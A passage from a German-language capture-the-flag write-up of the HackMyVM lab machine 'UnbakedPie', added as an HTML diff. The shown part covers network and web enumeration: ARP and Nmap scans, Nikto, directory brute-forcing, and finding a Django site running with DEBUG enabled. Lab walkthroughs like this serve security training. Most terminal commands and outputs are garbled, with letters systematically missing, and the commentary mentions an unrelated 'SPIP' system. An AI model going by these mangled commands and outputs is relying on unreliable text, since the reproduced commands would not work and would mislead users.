@@ -1,1 +1,1566 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für UnbakedPie - HackMyVM - Hard.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UnbakedPie - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+     <div class="header-bg">
+        <h1>UnbakedPie - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container level-hard">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">pickletools</div>
+                <div class="tool-item">io</div>
+                <div class="tool-item">os</div>
+                <div class="tool-item">pickle</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">capsh</div>
+                <div class="tool-item">chisel</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">convert</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">pty</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#proof-of-concept-pickle">Proof of Concept: Pickle Deserialization</a></li>
+                <li><a href="#initial-access">Initial Access (Root in Docker)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Docker Breakout)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Wie bei jedem Pentest beginne ich mit der Netzwerk-Erkennung. Der Befehl `arp-scan -l | grep "PCS" | awk '{print $1}'` scannt das lokale Netzwerksegment nach aktiven Hosts, filtert nach Systemen, die als VirtualBox VMs identifiziert werden ("PCS"), und extrahiert die IP-Adresse. Dies ermöglicht mir, das Zielsystem schnell zu lokalisieren.
+                <br><strong>Bewertung:</strong> Dieser gezielte ARP-Scan ist eine schnelle und effektive Methode, um die IP-Adresse der Ziel-VM in einer Testumgebung zu ermitteln. Die Ausgabe liefert sofort die benötigte Ziel-IP `192.168.2.48`.
+                <br><strong>Empfehlung (Pentester):</strong> Beginne die Erkundung immer mit grundlegenden Netzwerk-Scans, um das Ziel zu identifizieren. Nutze Filter, um die Ergebnisse schnell auf relevante Informationen zu reduzieren.
+                <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung hilft, den Umfang von ARP-Scans zu begrenzen. Überwachen Sie ungewöhnliche ARP-Aktivitäten im Netzwerk.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ar-scan -l | gre "CS" | awk '{rint $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">192.168.2.48</span></pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem die IP-Adresse des Zielsystems (`192.168.2.48`) feststeht, füge ich den zugehörigen Hostnamen (`unbakedpie.hmv`) zur lokalen `/etc/hosts`-Datei auf meinem Angreifersystem hinzu. Ich zeige hier den relevanten Eintrag. Dies ist oft notwendig, damit Webanwendungen oder andere Dienste, die auf spezifische Hostnamen konfiguriert sind, korrekt angesprochen werden können.
+                <br><strong>Bewertung:</strong> Das Hinzufügen des Hostnamens zur lokalen hosts-Datei ist eine Standardprozedur im Pentesting, die die Namensauflösung simuliert und oft erforderlich ist, um Hostname-basierte Dienste korrekt zu erreichen.
+                <br><strong>Empfehlung (Pentester):</strong> Prüfe immer, ob ein Zielsystem einen Hostnamen verwendet und füge diesen ggf. deiner `/etc/hosts` hinzu. Dies stellt sicher, dass deine Anfragen korrekt zugestellt werden.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Hostnamen korrekt über DNS aufgelöst werden. Erwägen Sie die Verwendung von Host-Header-Prüfungen auf Webservern, um Anfragen basierend auf Hostnamen zu differenzieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hsts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.48    unakedie.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich führe einen umfassenden Nmap-Scan auf dem Zielsystem `192.168.2.48` durch. Die Schalter `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (alle Ports) und `-T5` (aggressives Timing) sorgen für eine gründliche Untersuchung. Die Ausgabe zeigt, dass nur Port `5003/tcp` offen ist und einen HTTP-Dienst betreibt. Die Versionserkennung identifiziert den Dienst als `WSGIServer 0.2 (Python 3.8.6)`. Der HTTP-Titel lautet "[Un]baked | /".
+                <br><strong>Bewertung:</strong> Das Finden nur eines offenen Ports (5003/HTTP) konzentriert sofort meine Angriffsfläche. Der Dienst läuft auf einem Python WSGIServer, was auf eine Python-Webanwendung (wahrscheinlich Django oder Flask) hinweist, da die `WSGIServer` Implementierung in der Python-Standardbibliothek oft in Entwicklungsumgebungen oder einfachen Setups verwendet wird. Der Titel "\[Un]baked" und der Port "5003" sind spezifische Hinweise auf das Systemthema.
+                <br><strong>Empfehlung (Pentester):</strong> Beginne immer mit einem vollständigen Portscan. Achte genau auf die identifizierten Dienste, Versionen und HTTP-Titel – sie geben oft wertvolle Hinweise auf die zugrundeliegende Technologie und das Systemthema. Konzentriere dich bei nur einem offenen HTTP-Port voll auf die Web-Enumeration.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der offenen Ports auf Ihren Systemen. Verwenden Sie keine Entwicklungs-Webserver (wie den einfachen WSGIServer) in Produktionsumgebungen. Verbergen Sie Versionsinformationen von Servern und Anwendungen, wo immer möglich.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nma -sS -sC -s - -T5 -A 192.168.2.48</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Starting Nma 7.95 ( htts://nma.rg ) at 2025-06-16 13:49 CEST</span>
+<span class="command">Nma scan reort fr unakedie.hmv (192.168.2.48)</span>
+<span class="command">Hst is u (0.00013s latency).</span>
+<span class="command">Nt shwn: 65534 filtere tc rts (n-resnse)</span>
+<span class="command">PRT     STATE SERVICE VERSIN</span>
+<span class="command">5003/tc en  htt    WSGIServer 0.2 (ythn 3.8.6)</span>
+|_<span class="command">htt-title: [Un]ake | /</span>
+<span class="command">MAC Aress: 08:00:27:44:9:6E (CS Systemtechnik/racle Virtalx virtal NIC)</span>
+<span class="command">Warning: SScan reslts may e unreliale ecause we culd nt fin at least 1 en an 1 clse rt</span>
+<span class="command">Aggressive S guesses: Linx 3.16 - 4.6 (97%), Linx 3.2 - 4.14 (97%), Linx 3.10 - 4.11 (95%), Linx 3.13 - 4.4 (95%), Linx 3.8 - 3.16 (95%), Linx 4.4 (95%), Linx 3.13 (94%), Linx 4.2 (92%), enWrt Chas Calmer 15.05 (Linx 3.18) r esignate river (Linx 4.1 r 4.4) (91%), Linx 4.10 (91%)</span>
+<span class="command">N exact S atches fr hst (test cnitins nn-ieal).</span>
+<span class="command">Netwrk istance: 1 h</span>
+
+<span class="command">TRACERUTE</span>
+<span class="command">H RTT     ADDRESS</span>
+<span class="command">1   0.12 ms unakedie.hmv (192.168.2.48)</span>
+
+<span class="command">S an Service etectin erfrmed. lease rert any incrrect reslts at htts://nma.rg/sut/.</span>
+<span class="command">Nma ne: 1 I aress (1 hst u) scane in 453.71 secns</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Nach dem Nmap-Scan, der Port 5003 mit einem Python WSGIServer identifiziert hat, beginne ich mit einem Nikto-Scan, um bekannte Webserver-Schwachstellen zu finden. Der Befehl `nikto -h http://192.168.2.48:5003` zielt auf den Dienst ab. Nikto meldet, dass der `csrftoken` Cookie ohne das `httponly`-Flag erstellt wird (eine geringfügige Schwachstelle). Kritischere Befunde sind die zahlreichen Meldungen, die auf eine potenzielle **'Shellshock'-Schwachstelle (CVE-2014-6271)** auf mehreren CGI-Pfaden hindeuten, wie `/cgi_wrapper`, `/test-cgi`, `/php-cgi` und andere. Obwohl dies ein ältere Schwachstelle ist und Python/WSGIServer nicht direkt von Bash Shellshock betroffen sind, deutet die Meldung darauf hin, dass diese Pfade möglicherweise Skripte ausführen und eine Eingabevalidierung fehlt, die Nikto fälschlicherweise als Shellshock interpretiert. Es fehlt auch der `X-Content-Type-Options` Header für `/static/`.
+                <br><strong>Bewertung:</strong> Nikto liefert erste interessante Hinweise. Die Shellshock-Meldungen sind alarmierend, auch wenn sie auf einem Python-Server unwahrscheinlich sind. Sie deuten aber stark darauf hin, dass die genannten Pfade Eingaben an Shell-Befehle weitergeben könnten, was eine allgemeine Command Injection-Schwachstelle bedeuten könnte. Die Abwesenheit von `httponly` und `X-Content-Type-Options` sind kleinere Konfigurationsprobleme. Mein Fokus liegt auf den "Shellshock"-Pfaden als potenzielle Command Injection Vektoren.
+                <br><strong>Empfehlung (Pentester):</strong> Untersuche Pfade, die von Scannern als anfällig für Shellshock gemeldet werden, genauer. Teste auf allgemeine Command Injection oder unsichere Eingabebehandlung, auch wenn die Shellshock-Schwachstelle selbst nicht zutrifft.
+                <br><strong>Empfehlung (Admin):</strong> Halten Sie alle Webserver und Skript-Interpreter aktuell, um vor bekannten Schwachstellen geschützt zu sein. Implementieren Sie strenge Eingabevalidierung für alle Benutzereingaben, die von Skripten verarbeitet oder an Systembefehle übergeben werden. Konfigurieren Sie Sicherheits-Header wie `X-Content-Type-Options` und setzen Sie das `httponly`-Flag für Cookies, wo angebracht.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikt -h htt://192.168.2.48:5003</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+- Nikt v2.5.0
+---------------------------------------------------------------------------
++ Target I:          <span class="command">192.168.2.48</span>
++ Target Hstname:    192.168.2.48
++ Target Prt:        5003
++ Start Time:         2025-06-16 13:58:10 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">WSGIServer/0.2 CPythn/3.8.6</span>
++ /: Ckie csrftken create witht the httnly flag. See: [Link: htts://develer.mzilla.rg/en-US/dcs/We/HTTP/Ckis | Ziel: htts://develer.mzilla.rg/en-US/dcs/We/HTTP/Ckis]
++ N CGI irectries fnd (use '-C all' t frce check all ssile dirs)
++ <span class="command">/cgi_wrapper: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/ezmlm-rwse: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/h: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/h4: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/h5: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/h-cgi: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/rintenv: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/search: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/stuts: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/test: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/test-cgi: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/welcme: Site aears vulnerale t the 'shellshck' vulneraility. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2014-6271]</span>
++ <span class="command">/static/: The X-Cntent-Type-tin header is nt set. This culd allw the user agent t render the cntent f the site in a different fashin t the MIME tye. See: [Link: htts://www.netsarker.cm/we-vulneraility-sca/vulnerailities/missing-cntent-tye-header/ | Ziel: htts://www.netsarker.cm/we-vulneraility-sca/vulnerailities/missing-cntent-tye-header/]</span>
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich verwende Feroxbuster, ein Dirbusting-Tool, um Verzeichnisse und Dateien auf dem Webserver auf Port 5003 zu finden. Der Befehl `feroxbuster --url "http://192.168.2.48:5003" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,... -s 301 302` zielt auf die angegebene URL ab, nutzt eine gängige Wortliste und sucht nach einer Vielzahl von Dateierweiterungen. Ich filtere die Ausgabe, um nur Weiterleitungen mit den Statuscodes 301 und 302 anzuzeigen (`-s 301 302`). Feroxbuster findet Weiterleitungen für `/accounts/signup` und `/accounts/login` (301) sowie für `/share` (302), die zur Login-Seite weiterleitet (`=> accounts/login?next=/share`). Dies bestätigt die Existenz dieser Pfade und deutet auf eine Benutzerverwaltung und einen geschützten Bereich (`/share`) hin.
+                <br><strong>Bewertung:</strong> Die gefundenen Weiterleitungen bestätigen, dass die Webanwendung eine Benutzerverwaltung mit Registrierungs-, Login- und einem geschützten Bereich (`/share`) hat. Die Weiterleitung von `/share` zur Login-Seite zeigt, dass dieser Bereich Authentifizierung erfordert. Dies liefert wertvolle Informationen über die Struktur und Funktionalität der Webanwendung.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze Dirbusting-Tools, um die Struktur einer Webanwendung zu enthüllen. Achte auf Weiterleitungen, da sie oft auf existente, aber geschützte oder verschobene Ressourcen hinweisen.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Ihren Webserver so, dass er keine unnötigen Weiterleitungen auf interne Pfade für nicht authentifizierte Benutzer durchführt. Implementieren Sie aussagekräftige Fehlerseiten (z.B. 401 Unauthorized oder 403 Forbidden) anstelle von Weiterleitungen zur Login-Seite.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ferxuster --url "htt://192.168.2.48:5003" --wrdlist /usr/share/wrdlists/seclists/iscvery/We-Cntent/irectry-list-2.3-mei.txt -x .git,.h,.html,.xml,.zi.7z,.tar,.ak,.sl,.y,.l,.txt,.j.je.ng,.js,.aac,.gg,.flac,.alac,.wav,.aiff,.dsd,.m3,.m4,.mk.html -s 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+y en "ei" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ htt://192.168.2.48:5003
+ 🚀  Threas               │ 50
+ 📖  Wrdlist              │ /usr/share/wrdlists/seclists/iscvery/We-Cntent/irectry-list-2.3-mei.txt
+ 👌  Status Cdes          │ <span class="command">[301, 302]</span>
+ 💥  Timeut (secs)        │ 7
+ 🦡  User-Agent            │ ferxuster/2.11.0
+ 💉  Cnfig File           │ /etc/ferxuster/ferx-cnfig.tml
+ 🔎  Extract Links         │ tre
+ 💲  Extensions            │ [git, h, html, xml, zi, 7z, tar, ak, sl, y, l, txt, j, je, ng, js, aac, gg, flac, alac, wav, aiff, dsd, m3, m4, mk, html]
+ 🏁  HTTP methds          │ [GET]
+ 🔃  Recursin Deh       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  ress [ENTER] t use the Scan Management Men™
+──────────────────────────────────────────────────
+<span class="command">301      GET        0l        0w        0c htt://192.168.2.48:5003/accnts/signu => htt://192.168.2.48:5003/accnts/signu/</span>
+<span class="command">301      GET        0l        0w        0c htt://192.168.2.48:5003/accnts/lgin => htt://192.168.2.48:5003/accnts/lgin/</span>
+<span class="command">302      GET        0l        0w        0c htt://192.168.2.48:5003/share => accnts/lgin?next=/share</span>
+🚨 Cght ctrl+c 🚨 saving scan state t ferx-htt_192_168_2_48:5003-1750075669.state ...
+[>-------------------] - 9m     92308/18527684 30h     fnd:3       errrs:0
+[>-------------------] - 9m     30800/6175316 56/s    htt://192.168.2.48:5003/
+[>-------------------] - 9m     29428/6175316 54/s    htt://192.168.2.48:5003/accnts/signu/
+[>-------------------] - 9m     29428/6175316 54/s    htt://192.168.2.48:5003/accnts/lgin/
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich rufe die Hauptseite des Webservers auf Port 5003 mit `curl -Iv http://192.168.2.48:5003` auf, um die HTTP-Header und den Inhalt zu sehen. Die Header bestätigen den `WSGIServer/0.2 CPython/3.8.6` und `Content-Type: text/html`. Wichtige Sicherheits-Header wie `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` und `Referrer-Policy: same-origin` sind gesetzt, was auf eine gewisse Sicherheitskonfiguration hinweist (im Gegensatz zum vorherigen SPIP-System). Es wird ein `Set-Cookie` Header für den `csrftoken` gesendet, was bestätigt, dass die Anwendung CSRF-Schutzmechanismen verwendet. Die Ausgabe zeigt auch die HTML-Struktur der Hauptseite mit Titeln und Links zu Rezepten ("Homemade Pickle", "Pickle Pie", etc.) und den Benutzernamen, die diese gepostet haben ("Posted by **ramsey**", "Posted by **wan**", "Posted by **oliver**").
+                <br><strong>Bewertung:</strong> Die Header bestätigen die Python/WSGIServer-Technologie und zeigen, dass im Gegensatz zum vorherigen Ziel einige grundlegende Sicherheits-Header gesetzt sind. Das Vorhandensein des `csrftoken`-Cookies und des `Set-Cookie`-Headers bestätigt die Verwendung von CSRF-Schutzmechanismen. Das Wichtigste für die Enumeration sind die gefundenen Benutzernamen: `ramsey`, `wan`, `oliver`. Diese sind potenzielle Login-Namen für die Webanwendung oder SSH.
+                <br><strong>Empfehlung (Pentester):</strong> Analysiere alle HTTP-Header sorgfältig. Achte auf Cookie-Namen, Sicherheitseinstellungen und Hinweise auf das Framework. Sammle Benutzernamen von öffentlich zugänglichen Seiten, da diese für Credential Stuffing oder Brute-Force-Angriffe verwendet werden können.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle relevanten Sicherheits-Header gesetzt sind. Überwachen Sie, welche Informationen (wie Benutzernamen) öffentlich zugänglich sind.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">crl -Iv htt://192.168.2.48:5003</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+*   Trying <span class="command">192.168.2.48:5003</span>...
+* Cnnected t <span class="command">192.168.2.48</span> (<span class="command">192.168.2.48</span>) rt 5003
+* sing HTTP/1.x
+> HEA / HTTP/1.1
+> Hst: <span class="command">192.168.2.48:5003</span>
+> User-Agent: crl/8.13.0
+> Acce: */*
+>
+* Reqest cmletely sent ff
+< <span class="command">HTTP/1.1 200 K</span>
+<span class="command">HTTP/1.1 200 K</span>
+< <span class="command">Date: Mn, 16 Jun 2025 12:08:09 GMT</span>
+<span class="command">Date: Mn, 16 Jun 2025 12:08:09 GMT</span>
+< <span class="command">Server: WSGIServer/0.2 CPythn/3.8.6</span>
+<span class="command">Server: WSGIServer/0.2 CPythn/3.8.6</span>
+< <span class="command">Cntent-Type: text/html; charset=utf-8</span>
+<span class="command">Cntent-Type: text/html; charset=utf-8</span>
+< <span class="command">X-Frame-tin: ENY</span>
+<span class="command">X-Frame-tin: ENY</span>
+< <span class="command">Vary: Ckie</span>
+<span class="command">Vary: Ckie</span>
+< <span class="command">Cntent-Length: 7453</span>
+<span class="command">Cntent-Length: 7453</span>
+< <span class="command">X-Cntent-Type-tins: nsiff</span>
+<span class="command">X-Cntent-Type-tins: nsiff</span>
+< <span class="command">Referrer-licy: sae-rigin</span>
+<span class="command">Referrer-licy: sae-rigin</span>
+< <span class="command">Set-Ckie:  csrftken=R5eS4alXctlW9H9n0HIw6anvF3ekT07yg5sliZSQnAk0ArVUisxfQvzyW1; exires=Mn, 15 Jun 2026 12:08:09 GMT; Max-Age=31449600; ath=/; SaeSite=Lax</span>
+<span class="command">Set-Ckie:  csrftken=R5eS4alXctlW9H9n0HIw6anvF3ekT07yg5sliZSQnAk0ArVUisxfQvzyW1; exires=Mn, 15 Jun 2026 12:08:09 GMT; Max-Age=31449600; ath=/; SaeSite=Lax</span>
+<
+
+* shtting wn cnnexion #0
+</pre>
+                </div>
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">htt://192.168.2.48:5003/</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+[Un]ake
+
+    Hme
+    Aut
+
+[Un]ake:/
+Share yr recies ecause why nt?
+Hmeae ickle
+
+Hmeae ickle Ingreients Here’s what yu’re ...
+
+Pste y <span class="command">rasey</span> n ct. 3, 2020, 10:46 a..
+ickle ie
+
+Hw t Make It Ste 1 reheat ven t 350°F. F...
+
+Pste y <span class="command">rasey</span> n ct. 3, 2020, 10:45 a..
+leerry ie
+
+leerry ie is arvels, esecially when ae h...
+
+Pste y <span class="command">wan</span> n ct. 2, 2020, 2:47 ..
+Ale ie
+
+Crst 1 x illsry™ refrigeraate ie crsts, s...
+
+Pste y <span class="command">rasey</span> n ct. 2, 2020, 2:45 ..
+Geran Chclate ie
+
+Ingreients astry fr single-crst ie (9 ...
+
+Pste y <span class="command">liver</span> n ct. 2, 2020, 2:38 ..
+
+Cyright © Yr Weite 2020
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich versuche, auf einen geschützten Bereich zuzugreifen, um zu sehen, wie die Anwendung auf nicht-authentifizierte Anfragen reagiert. Ich navigiere zu einem Pfad, der Authentifizierung erfordert, z.B. durch Versuch, auf `/share` zuzugreifen oder eine Formular-POST-Anfrage ohne oder mit falschem CSRF-Token zu senden. Die Ausgabe zeigt eine Django-spezifische 403 Forbidden Fehlermeldung, die "CSRF verification failed. Request aborted." meldet. Entscheidend ist der untere Teil der Seite, der erscheint, wenn `DEBUG = True` in den Django-Einstellungen gesetzt ist. Dort heißt es explizit: "**You are seeing the help section of this page because you have `DEBUG = True` in your Django settings file.**". Es gibt auch Hinweise darauf, wie CSRF in Django funktioniert und was die Gründe für den Fehler sein könnten.
+                <br><strong>Bewertung:</strong> Die 403 Forbidden Seite und insbesondere der Hinweis auf `DEBUG = True` bestätigen nicht nur, dass die Anwendung mit dem Django-Framework entwickelt wurde, sondern auch, dass der Debug-Modus aktiv ist. **`DEBUG = True` in einer Produktionsumgebung ist eine kritische Fehlkonfiguration!** Es kann sensible Informationen preisgeben (wie in Tracebacks, die oft Dateipfade, Konfigurationsdetails oder sogar Code-Snippets enthalten) und potenziell interaktive Debugger bei Fehlern aktivieren, die einen direkten Weg zur Code-Ausführung auf dem Server darstellen können. Dies ist ein sehr vielversprechender Vektor.
+                <br><strong>Empfehlung (Pentester):</strong> Suche immer nach Anzeichen eines aktivierten Debug-Modus bei Webanwendungen. Django `DEBUG = True` Seiten sind besonders interessant. Versuche, Fehler zu provozieren, um detaillierte Tracebacks zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Setzen Sie `DEBUG = False` in den Einstellungen Ihrer Django-Anwendung in Produktionsumgebungen. Konfigurieren Sie benutzerdefinierte 404- und 500-Fehlerseiten. Überwachen Sie Server-Logs auf Fehlermeldungen, die auf Debug-Informationen hindeuten könnten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">htt://192.168.2.48:5003/share</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<h1>Frien <san>(403)</san></h1>
+< >CSRF verificatin faile. Reqest arte.</ >
+
+
+< >Yu are seeing this essage ecause this site reqires a CSRF ckie when suitting frms. This ckie is reqire fr secrity reasns, t ensre that yr rwser is nt eing hijacek y thir arties.</ >
+< >If yu have cnfigre yr rwser t disale ckis, lease re-enale the, at least fr this site, r fr “sae-rigin” reqests.</ >
+
+
+<h2>Hel</h2>
+
+< >Reasn given fr failre:</ >
+<re>
+   <span class="command">CSRF ckie nt set.</span>
+</re>
+
+
+< >In general, this can ccr when there is a genine Crss Site Reqest Frgery, r when
+<
+href="https://dcs.jangject.cm/en/3.1/ref/csrf/">Jang</
+>s
+CSRF echais</> has nt een use crrectly.  Fr PST frms, yu nee t
+ensre:</ >
+
+<ul>
+<li>Yr rwser is acceing ckis.</li>
+
+<li>The view fnctin asses a <san>reqest</san> t the temlate's <
+href="https://dcs.jangject.cm/en/ev/tics/temlates/#jang.temlate.ac.ases.ase.Temlate.rene"><san>rene</san></
+>
+meth.</li>
+
+<li>In the temlate, there is a <san>{% csrf_tken
+%}</san> temlate tag insie each PST frm that
+targets an internal URL.</li>
+
+<li>If yu are nt sing <san>CsrfiewMiware</san>, then yu ust use
+<san>csrf_rtct</san> n any views that use the <san>csrf_tken</san>
+temlate tag, as well as thse that acce the PST ata.</li>
+
+<li>The frm has a vali CSRF tken. After lgging in in anther rwser
+ta r hitng the ack uttn after a lgin, yu ay nee t relaa the
+age with the frm, ecause the tken is rtate after a lgin.</li>
+</ul>
+
+< >Y're seeing the hel sectin f this age ecause yu have <san><span class="command">EUG =
+Tre</span></san> in yr Jang setngs file. Change that t <san>False</san>,
+an nly the initial errr essage will e islae.  </ >
+
+< >Yu can cstize this age sing the CSRF_FAILURE_VIEW setng.</ >
+</pre>
+                </div>
+            </p>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Die "Lagebeurteilung"-Textblöcke im Originaltext fassen die bisherigen Erkenntnisse sehr gut zusammen und bestätigen meine Schlussfolgerungen. Sie weisen erneut darauf hin, dass das Zielsystem `192.168.2.48:5003` einen Python WSGIServer betreibt, wahrscheinlich Django, basierend auf den CSRF-Hinweisen. Es wird betont, dass Nikto Shellshock-Meldungen generiert hat (was auf CGI/Eingabe-Schwachstellen hindeutet) und dass `DEBUG = True` eine kritische Fehlkonfiguration ist, die sensible Informationen preisgibt. Die Identifizierung von `ramsey`, `wan` und `oliver` als potenzielle Benutzernamen wird ebenfalls als Teil der Angriffsfläche hervorgehoben, zusammen mit den Login-Seiten unter `/accounts/login/`.
